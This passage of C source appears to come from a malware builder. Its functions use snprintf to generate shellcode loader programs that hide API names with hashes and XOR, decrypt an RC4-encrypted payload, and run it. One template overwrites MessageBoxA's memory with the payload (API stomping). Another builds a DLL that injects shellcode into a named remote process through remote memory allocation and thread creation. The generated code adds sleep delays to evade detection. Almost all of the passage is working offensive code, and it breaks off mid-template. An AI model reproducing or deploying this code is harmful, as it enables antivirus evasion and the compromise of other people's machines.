        "#define MessageBoxA_djb2                0x4A096AA1\n\n"


        "\nvoid obf(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\n\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\n\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char xkey[] = \"%s\";\n"
        "char pFunction032[] = {%s};\n"
        "char puser32[] = {%s};\n"



        "unsigned char EncryptedPayload[] = { %s };\n"
        "unsigned char ProtectedKey[] = { %s };\n"
        "#define HINT_BYTE 0x%02X\n\n"
        "#define INITIAL_HASH 4338         \n"
        "#define INITIAL_SEED 7 \n"
        "DWORD HashStringDjb2A(_In_ LPCSTR String)\n"
        "{\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (HashStringDjb2A((PCHAR) API))\n\n"
        "FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0)\n"
        "        return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER           pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)\n"
        "        return NULL;\n"
        "    PIMAGE_NT_HEADERS           pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)\n"
        "        return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER       ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY     pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD                      FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD                      FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD                       FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID   pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE GetModuleHandleH(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0)\n"
        "        return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB                    pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB                    pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA           pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY   pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)_toUpper(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "BOOL RC4_Guard(IN BYTE HintByte, IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {\n"
        "    BYTE            b = 0;\n"
        "    INT             i = 0;\n"
        "    PBYTE pRealKey = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwRc4KeySize);\n"
        "    HMODULE kernel = GetModuleHandleH(KERNEL32_djb2);\n"
        "    funLoadLibraryA pLoadLibraryA = (funLoadLibraryA)GetProcAddressH(kernel, LoadLibraryA_djb2);\n"
        "    funGetProcAddress pGetProcAddress = (funGetProcAddress)GetProcAddressH(kernel, GetProcAddress_djb2);\n"
        "    if (!pRealKey)\n"
        "        return 0;\n"
        "    while (1) {\n"
        "        if (((pRc4Key[0] ^ b)) == HintByte)\n"
        "            break;\n"
        "        else\n"
        "            b++;\n"
        "    }\n"
        "    for (int i = 0; i < dwRc4KeySize; i++) {\n"
        "        pRealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);\n"
        "    }\n"
        "    USTRING Key = { .Buffer = pRealKey, .Length = dwRc4KeySize, .MaximumLength = dwRc4KeySize },\n"
        "        Img = { .Buffer = pPayloadData, .Length = sPayloadSize, .MaximumLength = sPayloadSize };\n"

        "    char pAdvapi32[] = { 'A','d','v','a','p','i','3','2','\\0' };\n"
        "    obf((char*)pFunction032, sizeof(pFunction032), xkey, sizeof(xkey));\n"

        "    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)pGetProcAddress( pLoadLibraryA(pAdvapi32) , pFunction032);\n"
        "    SystemFunction032(&Img, &Key);\n"
        "    return TRUE;\n"
        "}\n"
        "BOOL API_stommping() {\n"
        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -500000;\n"
        "    DWORD old_protection = 0;\n"
        "    HANDLE hthread = NULL;\n"
        "    SIZE_T Spayload = sizeof(EncryptedPayload);\n"
        "    HMODULE kernel = GetModuleHandleH(KERNEL32_djb2);\n"
        "    HMODULE ntdll = GetModuleHandleH(NTDLL_djb2);\n"
        "    funLoadLibraryA pLoadLibraryA = (funLoadLibraryA)GetProcAddressH(kernel, LoadLibraryA_djb2);\n"

        "    obf((char*)puser32, sizeof(puser32), xkey, sizeof(xkey));\n"
        "    PVOID  address = GetProcAddressH(pLoadLibraryA(puser32), MessageBoxA_djb2);\n"


        "    funNtProtectVirtualMemory pNtProtectVirtualMemory = (funNtProtectVirtualMemory)GetProcAddressH(ntdll, NtProtectVirtualMemory_djb2);\n"
        "    fnNtCreateThreadEx pNtCreateThreadEx = (fnNtCreateThreadEx)GetProcAddressH(ntdll, NtCreateThreadEx_djb2);\n"
        "    funNtWaitForSingleObject pNtWaitForSingleObject = (funNtWaitForSingleObject)GetProcAddressH(ntdll, NtWaitForSingleObject_djb2);\n"
        "    fnNtClose pNtClose = (fnNtClose)GetProcAddressH(ntdll, NtClose_djb2);\n"
        "    pNtProtectVirtualMemory((HANDLE)-1 , &address, &Spayload, PAGE_READWRITE, &old_protection);\n"
        "    memcpy(address, EncryptedPayload, Spayload);\n"
        "    RC4_Guard(HINT_BYTE, ProtectedKey, address, sizeof(ProtectedKey), Spayload);\n"
        "    pNtProtectVirtualMemory((HANDLE)-1 , &address, &Spayload, PAGE_EXECUTE_READ, &old_protection);\n"
        "    pNtCreateThreadEx(&hthread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, address, NULL, FALSE, 0, 0, 0, NULL);\n"
        "    pNtWaitForSingleObject(hthread, FALSE, &timeout);\n"
        "    pNtClose(hthread);\n"
        "    return TRUE;\n"
        "}\n"
        "VOID delayEx(IN FLOAT fMinutes) {\n"
        "    HMODULE ntdll = GetModuleHandleH(NTDLL_djb2);\n"
        "    funNtDelayExecution pNtDelayExecution = (funNtDelayExecution)GetProcAddressH(ntdll, NtDelayExecution_djb2);\n"
        "    DWORD dwMilliSeconds = (DWORD)(fMinutes * 60000.0f);\n"
        "    LONGLONG Delay = (LONGLONG)dwMilliSeconds * -10000LL;\n"
        "    LARGE_INTEGER DelayInterval = { .QuadPart = Delay };\n"
        "    pNtDelayExecution(FALSE, &DelayInterval);\n"
        "}\n"
        "int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {\n"
        "    delayEx(0.5);\n"
        "    API_stommping();\n"
        "    return 0;\n"
        "}\n",
        xkey, obfuscated_fun, obfuscated_user32, shellcodeArray, keyArray, hint
    );
}
VOID deley_source_7_inject_explorar_DLL(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint, const char* Rprocess) {
    // Convert shellcode and key to hex string representation
    unsigned char shellcodeArray[8096] = { 0 };
    unsigned char keyArray[5012] = { 0 };
    creatHexArray(shellcodeArray, shellcode, shellcodeSize, sizeof(shellcodeArray));
    creatHexArray(keyArray, key, keySize, sizeof(keyArray));


    char* xkey = generate_random_string_key();
    char* obfuscated_fun = obf("SystemFunction032", xkey);
    char* Remotprocess = obf(Rprocess, xkey);


    snprintf(payload, size,
        "#include <windows.h>\n"
        "#include <winternl.h>\n\n"
        "typedef struct {\n"
        "    DWORD Length;\n"
        "    DWORD MaximumLength;\n"
        "    PVOID Buffer;\n"
        "} USTRING;\n"
        "typedef NTSTATUS(NTAPI* fnSystemFunction032)(USTRING* Img, USTRING* Key);\n"
        "typedef HMODULE(NTAPI* funLoadLibraryA)(LPCSTR);\n"
        "typedef enum _SECTION_INHERIT {\n"
        "    ViewShare = 1,\n"
        "    ViewUnmap = 2\n"
        "} SECTION_INHERIT, * PSECTION_INHERIT;\n"
        "typedef struct _PS_ATTRIBUTE {\n"
        "    ULONG Attribute;\n"
        "    SIZE_T Size;\n"
        "    union {\n"
        "        ULONG Value;\n"
        "        PVOID ValuePtr;\n"
        "    } ul;\n"
        "    PSIZE_T ReturnLength;\n"
        "} PS_ATTRIBUTE, * PPS_ATTRIBUTE;\n"
        "typedef struct _PS_ATTRIBUTE_LIST {\n"
        "    SIZE_T  TotalLength;\n"
        "    PS_ATTRIBUTE Attributes[1];\n"
        "} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;\n"
        "typedef struct tagPROCESSENTRY32W\n"
        "{\n"
        "    DWORD   dwSize;\n"
        "    DWORD   cntUsage;\n"
        "    DWORD   th32ProcessID;\n"
        "    ULONG_PTR th32DefaultHeapID;\n"
        "    DWORD   th32ModuleID;\n"
        "    DWORD   cntThreads;\n"
        "    DWORD   th32ParentProcessID;\n"
        "    LONG    pcPriClassBase;\n"
        "    DWORD   dwFlags;\n"
        "    WCHAR   szExeFile[MAX_PATH];\n"
        "} PROCESSENTRY32W;\n"
        "typedef PROCESSENTRY32W* PPROCESSENTRY32W;\n"
        "typedef PROCESSENTRY32W* LPPROCESSENTRY32W;\n"
        "#define PROCESSENTRY32 PROCESSENTRY32W\n"
        "#define LPPROCESSENTRY32 LPPROCESSENTRY32W\n"
        "#define TH32CS_SNAPPROCESS  0x00000002\n"
        "typedef HANDLE(NTAPI* funCreateToolhelp32Snapshot)(DWORD dwFlags, DWORD th32ProcessID);\n"
        "typedef BOOL(NTAPI* funProcess32First)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);\n"
        "typedef BOOL(NTAPI* funProcess32Next)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);\n"
        "typedef HANDLE(NTAPI*  funOpenProcess)(DWORD dwDesiredAccess, BOOL  bInheritHandle, DWORD dwProcessId);\n"
        "typedef int(NTAPI* funlstrcmpiA)(LPCSTR lpString1, LPCSTR lpString2);\n"
        "typedef NTSTATUS(NTAPI* funNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);\n"
        "typedef NTSTATUS(NTAPI* funNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);\n"
        "typedef NTSTATUS(NTAPI* funNtWriteVirtualMemory)(HANDLE ,PVOID ,PVOID ,ULONG,PULONG);\n"
        "typedef BOOL(NTAPI* funWriteProcessMemory)(HANDLE, LPVOID, LPCVOID , SIZE_T , SIZE_T* );\n"
        "typedef NTSTATUS(NTAPI* fnNtCreateThreadEx) (PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);\n"
        "typedef NTSTATUS(NTAPI* funNtWaitForSingleObject) (HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* fnNtClose)(HANDLE);\n"
        "typedef FARPROC(NTAPI* funGetProcAddress)(HMODULE, LPCSTR);\n"
        "typedef NTSTATUS(NTAPI* funNtDelayExecution)(BOOLEAN, PLARGE_INTEGER);\n\n"
        "#define NTDLL_djb2                      0x5251037A\n"
        "#define KERNEL32_djb2                   0xA5E086A2\n"
        "#define NtAllocateVirtualMemory_djb2    0x0B37D3B9\n"
        "#define NtProtectVirtualMemory_djb2     0x504D6BF5\n"
        "#define NtWaitForSingleObject_djb2      0xCB42C5A9\n"
        "#define NtCreateThreadEx_djb2           0x61D8C71D\n"
        "#define NtDelayExecution_djb2           0x1236E2D7\n"
        "#define NtClose_djb2                    0xF20D7F2A\n"
        "#define LoadLibraryA_djb2               0xA4E3F108\n"
        "#define GetProcAddress_djb2             0xB9D893EC\n"
        "#define WriteProcessMemory_djb2         0x54256ED5\n"
        "#define CreateToolhelp32Snapshot_djb2   0x5D3C1742\n"
        "#define Process32First_djb2             0xA00889BE\n"
        "#define Process32Next_djb2              0x35DB6F55\n"
        "#define OpenProcess_djb2                0x2007BE63\n"
        "#define lstrcmpiA_djb2                  0xC9B81F21\n\n"

        "\nvoid obf(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\n\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\n\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char xkey[] = \"%s\";\n"
        "char pFunction032[] = {%s};\n"
        "char pRprocess[] = {%s};\n"

        "funNtAllocateVirtualMemory pNtAllocateVirtualMemory;\n"
        "funWriteProcessMemory pWriteProcessMemory;\n"
        "fnNtCreateThreadEx pNtCreateThreadEx;\n"
        "funNtWaitForSingleObject pNtWaitForSingleObject;\n"
        "fnNtClose pNtClose;\n"
        "funCreateToolhelp32Snapshot pCreateToolhelp32Snapshot;\n"
        "funProcess32First pProcess32First;\n"
        "funProcess32Next pProcess32Next;\n"
        "funOpenProcess pOpenProcess;\n"
        "funlstrcmpiA plstrcmpiA;\n\n"
        "CHAR _toUpper(CHAR C)\n"
        "{\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n\n"
        "char memory_pool[1024];\n"
        "unsigned int pool_index = 0;\n"
        "void* my_malloc(unsigned int size) {\n"
        "    if (pool_index + size > sizeof(memory_pool)) {\n"
        "        return 0; \n"
        "    }\n"
        "    void* ptr = &memory_pool[pool_index];\n"
        "    pool_index += size;\n"
        "    return ptr;\n"
        "}\n\n"
        "#define INITIAL_HASH 4338         \n"
        "#define INITIAL_SEED 7 \n"
        "DWORD HashStringDjb2A(_In_ LPCSTR String)\n"
        "{\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (HashStringDjb2A((PCHAR) API))\n\n"
        "FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0)\n"
        "        return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER           pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)\n"
        "        return NULL;\n"
        "    PIMAGE_NT_HEADERS           pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)\n"
        "        return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER       ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY     pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD                      FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD                      FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD                       FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID   pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE GetModuleHandleH(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0)\n"
        "        return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB                    pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB                    pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA           pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY   pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)_toUpper(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "BOOL RC4_Guard(IN BYTE HintByte, IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {\n"
        "    BYTE            b = 0;\n"
        "    INT             i = 0;\n"
        "    PBYTE           pRealKey = (PBYTE)my_malloc(dwRc4KeySize);\n"
        "    HMODULE kernel = GetModuleHandleH(KERNEL32_djb2);\n"
        "    funLoadLibraryA pLoadLibraryA = (funLoadLibraryA)GetProcAddressH(kernel, LoadLibraryA_djb2);\n"
        "    funGetProcAddress pGetProcAddress = (funGetProcAddress)GetProcAddressH(kernel, GetProcAddress_djb2);\n"

        "    if (!pRealKey)\n"
        "        return 0;\n"
        "    while (1) {\n"
        "        if (((pRc4Key[0] ^ b)) == HintByte)\n"
        "            break;\n"
        "        else\n"
        "            b++;\n"
        "    }\n"
        "    for (int i = 0; i < dwRc4KeySize; i++) {\n"
        "        pRealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);\n"
        "    }\n"
        "    USTRING Key = { .Buffer = pRealKey, .Length = dwRc4KeySize, .MaximumLength = dwRc4KeySize },\n"
        "        Img = { .Buffer = pPayloadData, .Length = sPayloadSize, .MaximumLength = sPayloadSize };\n"

        "    char pAdvapi32[] = { 'A','d','v','a','p','i','3','2','\\0' };\n"
        "    obf((char*)pFunction032, sizeof(pFunction032), xkey, sizeof(xkey));\n"

        "    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)pGetProcAddress( pLoadLibraryA(pAdvapi32) , pFunction032);\n"
        "    SystemFunction032(&Img, &Key);\n"
        "    return TRUE;\n"
        "}\n"
        "unsigned char EncryptedPayload[] = { %s };\n"
        "unsigned char ProtectedKey[] = { %s };\n"
        "#define HINT_BYTE 0x%02X\n\n"
        "SIZE_T payload_len = sizeof(EncryptedPayload);\n\n"
        "int FindTarget(const char* procname) {\n"
        "    PROCESSENTRY32 pe32;\n"
        "    int pid = 0;\n"
        "    HANDLE hProcSnap = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n"
        "    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;\n"
        "    pe32.dwSize = sizeof(PROCESSENTRY32);\n"
        "    if (!pProcess32First(hProcSnap, &pe32)) {\n"
        "        pNtClose(hProcSnap);\n"
        "        return 0;\n"
        "    }\n"
        "    while (pProcess32Next(hProcSnap, &pe32)) {\n"
        "        if (plstrcmpiA(procname, (LPCSTR)pe32.szExeFile) == 0) {\n"
        "            pid = pe32.th32ProcessID;\n"
        "            break;\n"
        "        }\n"
        "    }\n"
        "    pNtClose(hProcSnap);\n"
        "    return pid;\n"
        "}\n"
        "int Inject(HANDLE hProc, unsigned char* payload, SIZE_T payload_len) {\n"
        "    PVOID         address = NULL;\n"
        "    HANDLE         hThread = NULL;\n"
        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -500000;\n"
        "    pNtAllocateVirtualMemory(hProc, &address, 0, &payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);\n"
        "    pWriteProcessMemory(hProc, address, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T*)NULL);\n"
        "    pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProc, address, NULL, 0, 0, 0, 0, 0);\n"
        "    pNtWaitForSingleObject(hThread, FALSE, &timeout);\n"
        "    pNtClose(hThread);\n"
        "}\n"
        "BOOL insialize_struct() {\n"
        "    HMODULE ntdll = GetModuleHandleH(NTDLL_djb2);\n"
        "    HMODULE kernel = GetModuleHandleH(KERNEL32_djb2);\n"
        "    pCreateToolhelp32Snapshot = (funCreateToolhelp32Snapshot)GetProcAddressH(kernel, CreateToolhelp32Snapshot_djb2);\n"
        "    pProcess32First = (funProcess32First)GetProcAddressH(kernel, Process32First_djb2);\n"
        "    pProcess32Next = (funProcess32Next)GetProcAddressH(kernel, Process32Next_djb2);\n"
        "    pOpenProcess =(funOpenProcess)GetProcAddressH(kernel, OpenProcess_djb2);\n"
        "    plstrcmpiA = (funlstrcmpiA)GetProcAddressH(kernel, lstrcmpiA_djb2);\n"
        "    pNtAllocateVirtualMemory = (funNtAllocateVirtualMemory)GetProcAddressH(ntdll, NtAllocateVirtualMemory_djb2);\n"
        "    pWriteProcessMemory = (funWriteProcessMemory)GetProcAddressH(kernel, WriteProcessMemory_djb2);\n"
        "    pNtCreateThreadEx = (fnNtCreateThreadEx)GetProcAddressH(ntdll, NtCreateThreadEx_djb2);\n"
        "    pNtWaitForSingleObject = (funNtWaitForSingleObject)GetProcAddressH(ntdll, NtWaitForSingleObject_djb2);\n"
        "    pNtClose = (fnNtClose)GetProcAddressH(ntdll, NtClose_djb2);\n"
        "}\n"
        "VOID delayEx(IN FLOAT fMinutes) {\n"
        "    HMODULE ntdll = GetModuleHandleH(NTDLL_djb2);\n"
        "    funNtDelayExecution pNtDelayExecution = (funNtDelayExecution)GetProcAddressH(ntdll, NtDelayExecution_djb2);\n"
        "    DWORD dwMilliSeconds = (DWORD)(fMinutes * 60000.0f);\n"
        "    LONGLONG Delay = (LONGLONG)dwMilliSeconds * -10000LL;\n"
        "    LARGE_INTEGER DelayInterval = { .QuadPart = Delay };\n"
        "    pNtDelayExecution(FALSE, &DelayInterval);\n"
        "}\n"
        "VOID start () {\n"
        "    insialize_struct();\n"
        "    int pid = 0;\n"
        "    obf((char*)pRprocess, sizeof(pRprocess), xkey, sizeof(xkey)); \n"
        "    pid = FindTarget(pRprocess);\n"
        "    if (pid) {\n"
        "        HANDLE hProc = pOpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD)pid);\n"
        "        if (hProc != NULL) {\n"
        "            RC4_Guard(HINT_BYTE, ProtectedKey, EncryptedPayload, sizeof(ProtectedKey), sizeof(EncryptedPayload) );\n"
        "            Inject(hProc, EncryptedPayload, payload_len);\n"
        "            pNtClose(hProc);\n"
        "        }\n"
        "    }\n"
        "}\n"
        "VOID run() {\n"
        "    delayEx(0.5);\n"
        "    start();\n"
        "}\n"
        "extern __declspec(dllexport) int hacked() {\n"
        "    run();\n"
        "}\n"
        "BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {\n"
        "    switch (ul_reason_for_call)  {\n"
        "    case DLL_PROCESS_ATTACH:\n"
        "    case DLL_PROCESS_DETACH:\n"
        "    case DLL_THREAD_ATTACH:\n"
        "    case DLL_THREAD_DETACH:\n"
        "        break;\n"
        "    }\n"
        "    return TRUE;\n"
        "}\n",
        xkey, obfuscated_fun, Remotprocess, shellcodeArray, keyArray, hint
    );
}
VOID deley_source_7_inject_explorar(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint, const char* Rprocess) {
    // Convert shellcode and key to hex string representation
    unsigned char shellcodeArray[8096] = { 0 };
    unsigned char keyArray[5012] = { 0 };
    creatHexArray(shellcodeArray, shellcode, shellcodeSize, sizeof(shellcodeArray));
    creatHexArray(keyArray, key, keySize, sizeof(keyArray));

    char* xkey = generate_random_string_key();
    char* obfuscated_fun = obf("SystemFunction032", xkey);
    char* Remotprocess = obf(Rprocess, xkey);

    snprintf(payload, size,
        "#include <windows.h>\n"
        "#include <winternl.h>\n\n"
        "typedef struct {\n"
        "    DWORD Length;\n"
        "    DWORD MaximumLength;\n"
        "    PVOID Buffer;\n"
        "} USTRING;\n"
        "typedef NTSTATUS(NTAPI* fnSystemFunction032)(USTRING* Img, USTRING* Key);\n"
        "typedef HMODULE(NTAPI* funLoadLibraryA)(LPCSTR);\n"
        "typedef enum _SECTION_INHERIT {\n"
        "    ViewShare = 1,\n"
        "    ViewUnmap = 2\n"
        "} SECTION_INHERIT, * PSECTION_INHERIT;\n"
        "typedef struct _PS_ATTRIBUTE {\n"
        "    ULONG Attribute;\n"
        "    SIZE_T Size;\n"
        "    union {\n"
        "        ULONG Value;\n"
        "        PVOID ValuePtr;\n"
        "    } ul;\n"
        "    PSIZE_T ReturnLength;\n"
        "} PS_ATTRIBUTE, * PPS_ATTRIBUTE;\n"
        "typedef struct _PS_ATTRIBUTE_LIST {\n"
        "    SIZE_T  TotalLength;\n"
        "    PS_ATTRIBUTE Attributes[1];\n"
        "} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;\n"
        "typedef struct tagPROCESSENTRY32W\n"
        "{\n"
        "    DWORD   dwSize;\n"
        "    DWORD   cntUsage;\n"
        "    DWORD   th32ProcessID;\n"
        "    ULONG_PTR th32DefaultHeapID;\n"
        "    DWORD   th32ModuleID;\n"
        "    DWORD   cntThreads;\n"
        "    DWORD   th32ParentProcessID;\n"
        "    LONG    pcPriClassBase;\n"
        "    DWORD   dwFlags;\n"
        "    WCHAR   szExeFile[MAX_PATH];\n"
        "} PROCESSENTRY32W;\n"
        "typedef PROCESSENTRY32W* PPROCESSENTRY32W;\n"
        "typedef PROCESSENTRY32W* LPPROCESSENTRY32W;\n"
        "#define PROCESSENTRY32 PROCESSENTRY32W\n"
        "#define LPPROCESSENTRY32 LPPROCESSENTRY32W\n"
        "#define TH32CS_SNAPPROCESS  0x00000002\n"
        "typedef HANDLE(NTAPI* funCreateToolhelp32Snapshot)(DWORD dwFlags, DWORD th32ProcessID);\n"
        "typedef BOOL(NTAPI* funProcess32First)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);\n"
        "typedef BOOL(NTAPI* funProcess32Next)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);\n"
        "typedef HANDLE(NTAPI*  funOpenProcess)(DWORD dwDesiredAccess, BOOL  bInheritHandle, DWORD dwProcessId);\n"
        "typedef int(NTAPI* funlstrcmpiA)(LPCSTR lpString1, LPCSTR lpString2);\n"
        "typedef NTSTATUS(NTAPI* funNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);\n"
        "typedef NTSTATUS(NTAPI* funNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);\n"
        "typedef NTSTATUS(NTAPI* funNtWriteVirtualMemory)(HANDLE ,PVOID ,PVOID ,ULONG,PULONG);\n"
        "typedef BOOL(NTAPI* funWriteProcessMemory)(HANDLE, LPVOID, LPCVOID , SIZE_T , SIZE_T* );\n"
